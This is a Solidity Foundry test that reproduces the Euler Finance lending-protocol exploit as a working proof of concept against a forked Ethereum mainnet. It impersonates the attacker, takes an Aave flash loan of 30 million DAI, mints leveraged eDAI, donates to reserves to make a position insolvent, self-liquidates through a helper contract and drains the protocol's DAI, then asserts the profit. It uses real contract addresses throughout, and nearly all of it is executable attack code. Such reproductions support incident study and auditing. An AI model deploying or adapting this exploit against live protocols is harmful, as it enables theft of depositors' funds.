
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 16817995;
    uint256 constant TX_TIMESTAMP = 1678697459;
    uint256 constant TX_BLOCK_NUMBER = 16817996;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        EulerAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (EulerAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = EulerAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new EulerAttack();
        }
        _etchChildRuntime();
        _bindAttackChildren(attack);
    }

    function _prepareProfit(EulerAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(EulerAttack attack) internal pure returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(EulerAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(EulerAttack).runtimeCode);
    }

    function _etchChildRuntime() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_F12B, type(AttackChild).runtimeCode);
    }

    function _bindAttackChildren(EulerAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attack_child, attackChild, Addresses.dDAI, "dDAI", 135765629009398797440000001
        );
        _expectProfit(Addresses.attack_child, attackChild, Addresses.eDAI, "eDAI", 2);
        _expectProfit(
            Addresses.attack_child_F12B, address(0), Addresses.dDAI, "dDAI", 259319058410413226611199998
        );
        _expectProfit(
            Addresses.attack_child_F12B, address(0), Addresses.eDAI, "eDAI", 272866200401038562655879869
        );
        _expectProfit(Addresses.attack_contract, attack, Addresses.DAI, "DAI", 8877507348306697267428294);
    }
}

contract EulerAttack {
    AttackChild public attackChild;

    AttackChild public liquidationChild;

    function _bindKnownChildren() internal {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(Addresses.attack_child));
        }
        if (address(liquidationChild) == address(0)) {
            liquidationChild = AttackChild(payable(Addresses.attack_child_F12B));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _bindKnownChildren();
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) _bindKnownChildren();
        _startAaveFlashLoan();
    }

    function _startAaveFlashLoan() internal {
        _readDaiDecimals();
        _readDaiDecimals();
        _readEulerDai();
        _borrowDaiFromAave();
    }

    function _readDaiDecimals() internal {
        IDAI(Addresses.DAI).decimals();
    }

    function _readEulerDai() internal view {
        IERC20Like(Addresses.DAI).balanceOf(Addresses.Euler);
    }

    function _borrowDaiFromAave() internal {
        IAaveLendingPool(Addresses.AaveLendingPool)
            .flashLoan(
                address(this),
                _addressArray1(Addresses.DAI),
                _uintArray1(30000000000000000000000000),
                _uintArray1(0),
                address(this),
                hex"",
                uint16(0)
            );
    }

    function _flashCallback() internal {
        flashCallbackDone = true;
        _fundAttackChild();
        _enterAttackChild();
    }

    function _fundAttackChild() internal {
        IERC20Like(Addresses.DAI).approve(Addresses.AaveLendingPool, type(uint256).max);
        require(address(attackChild).code.length != 0, "attack child runtime missing");
        AttackChild(payable(address(attackChild))).confirmChildReady();
        uint256 borrowedAmount = 30000000000000000000000000;
        IERC20Like(Addresses.DAI).transfer(address(attackChild), borrowedAmount);
    }

    function _enterAttackChild() internal {
        bytes memory childCall = abi.encodeWithSelector(
            bytes4(0x9f443549),
            address(this),
            uint256(30000000),
            uint256(200000000),
            uint256(100000000),
            uint256(44000000),
            Addresses.DAI,
            Addresses.eDAI,
            Addresses.dDAI
        );
        (bool ok,) = address(attackChild).call(childCall);
        require(ok, "attack child callback failed");
    }

    receive() external payable {}

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        assets;
        amounts;
        premiums;
        initiator;
        params;
        if (!flashCallbackDone) _flashCallback();
        return true;
    }

    fallback() external payable {
        if (msg.sig == 0x863df8af) {
            _startAaveFlashLoan();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x583c21631c48D442B5C0E605d624f54A0B366c72));
        liquidationChild = AttackChild(payable(0xA0b3ee897f233F385E5D61086c32685257d4f12b));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bool private flashCallbackDone;

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }
}

contract AttackChild {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x9f443549) {
            _runEulerMintLoop();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0xa515d3c6) {
            _liquidateAndSettle();
            bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function flashCallback() external payable {
        _runEulerMintLoop();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function flashCallback2() external payable {
        _liquidateAndSettle();
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _entryCb() internal {}

    function _runEulerMintLoop() internal {
        _readDaiDecimals();
        _readChildDai();
        _approveEuler();
        _readDaiDecimals();
        _depositDai();
        _mintAndRepayDebt();
        _mintAndDonate();
        _enterLiquidation();
    }

    function _readDaiDecimals() internal {
        IDAI(Addresses.DAI).decimals();
    }

    function _readChildDai() internal {
        IERC20Like(Addresses.DAI).balanceOf(address(this));
        IDAI(Addresses.DAI).decimals();
    }

    function _approveEuler() internal {
        IERC20Like(Addresses.DAI).approve(Addresses.Euler, type(uint256).max);
    }

    function _depositDai() internal {
        IeDAI(Addresses.eDAI).deposit(0, 20000000000000000000000000);
        IDAI(Addresses.DAI).decimals();
    }

    function _mintAndRepayDebt() internal {
        IeDAI(Addresses.eDAI).mint(0, 200000000000000000000000000);
        IDAI(Addresses.DAI).decimals();
        IdDAI(Addresses.dDAI).repay(0, 10000000000000000000000000);
        IDAI(Addresses.DAI).decimals();
    }

    function _mintAndDonate() internal {
        IeDAI(Addresses.eDAI).mint(0, 200000000000000000000000000);
        IeDAI(Addresses.eDAI).donateToReserves(0, 100000000000000000000000000);
    }

    function _enterLiquidation() internal {
        bytes memory childCall = abi.encodeWithSelector(
            bytes4(0xa515d3c6),
            Addresses.attack_contract,
            uint256(30000000),
            uint256(200000000),
            uint256(100000000),
            uint256(44000000),
            Addresses.attack_child,
            Addresses.DAI,
            Addresses.eDAI,
            Addresses.dDAI
        );
        (bool ok,) = Addresses.attack_child_F12B.call(childCall);
        require(ok, "liquidation child callback failed");
    }

    function confirmChildReady() public {
        require(Addresses.attack_child_F12B.code.length != 0, "liquidation child runtime missing");
        AttackChild(payable(Addresses.attack_child_F12B)).confirmLiquidator();
    }

    function _liquidateAndSettle() internal {
        _checkLiquidation();
        _liquidateChild();
        _withdrawEulerDai();
        _settleTokenFlows();
    }

    function _checkLiquidation() internal {
        IEulerLiquidator(Addresses.EulerLiquidator)
            .checkLiquidation(address(this), Addresses.attack_child, Addresses.DAI, Addresses.DAI);
    }

    function _liquidateChild() internal {
        IEulerLiquidator(Addresses.EulerLiquidator)
            .liquidate(
                Addresses.attack_child,
                Addresses.DAI,
                Addresses.DAI,
                259319058410413226611199998,
                317792863738251503199999999
            );
        IDAI(Addresses.DAI).decimals();
    }

    function _withdrawEulerDai() internal {
        uint256 daiBalanceOfEuler = IERC20Like(Addresses.DAI).balanceOf(Addresses.Euler);
        IeDAI(Addresses.eDAI).withdraw(0, daiBalanceOfEuler);
        IERC20Like(Addresses.DAI).balanceOf(address(this));
    }

    function _settleTokenFlows() internal {
        uint256 liquidationDai = 38904507348306697267428294;
        IERC20Like(Addresses.DAI).transfer(Addresses.attack_contract, liquidationDai);
    }

    function confirmLiquidator() public {}
}


library Addresses {
    address internal constant ZERO = address(0);
    address internal constant aDAI = 0x028171bCA77440897B824Ca71D1c56caC55b68A3;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant Euler = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address internal constant InitializableAdminUpgradeabilityProxy = 0x464C71f6c2F760DdA6093dCB91C24c39e5d6e18c;
    address internal constant attack_child = 0x583c21631c48D442B5C0E605d624f54A0B366c72;
    address internal constant attacker_eoa = 0x5F259D0b76665c337c6104145894F4D1D2758B8c;
    address internal constant dDAI = 0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant AaveLendingPool = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    address internal constant attack_child_F12B = 0xA0b3ee897f233F385E5D61086c32685257d4f12b;
    address internal constant FiatTokenProxy = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant AppProxyUpgradeable_AE7AB9 = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant A_B66CD9_95DB = 0xb66cd966670d962C227B3EABA30a872DbFb995db;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant A_C02AAA_6CC2 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_D78492_F6B5 = 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5;
    address internal constant eDAI = 0xe025E3ca2bE02316033184551D4d3Aa22024D9DC;
    address internal constant attack_contract = 0xeBC29199C817Dc47BA12E3F86102564D640CBf99;
    address internal constant EulerLiquidator = 0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IAaveLendingPool {
    function flashLoan(
        address,
        address[] calldata,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata,
        uint16
    ) external;
}

interface IDAI {
    function decimals() external returns (uint256);
}

interface IEulerLiquidator {
    function checkLiquidation(address, address, address, address) external;
    function liquidate(address, address, address, uint256, uint256) external;
}

interface IdDAI {
    function repay(uint256, uint256) external;
}

interface IeDAI {
    function deposit(uint256, uint256) external;
    function donateToReserves(uint256, uint256) external;
    function mint(uint256, uint256) external;
    function withdraw(uint256, uint256) external;
    function mint(address to) external returns (uint256 liquidity);
}
